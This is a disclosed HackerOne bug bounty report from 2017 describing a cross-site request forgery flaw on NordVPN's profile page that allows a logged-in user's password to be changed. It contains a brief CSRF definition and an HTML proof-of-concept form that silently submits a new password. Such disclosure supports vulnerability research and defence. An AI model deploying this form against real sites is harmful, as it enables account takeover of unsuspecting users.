# CSRF to change password

## Report Details
- **Report ID**: 204703
- **URL**: https://hackerone.com/reports/204703
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-02-08T18:10:55.317Z
- **Disclosed**: 2022-01-12T08:33:48.507Z

## Reporter
- **Username**: paramdham
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
Description 

Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.


I have found CSRF to change password , 

POC 


<html>

  <body>
    <form action="https://nordvpn.com/profile/" method="POST">
      <input type="hidden" name="tmpl" value="settings" />
      <input type="hidden" name="password" value="password" />
      <input type="hidden" name="password&#95;confirmation" value="password" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Thanks

## Attachments
No attachments
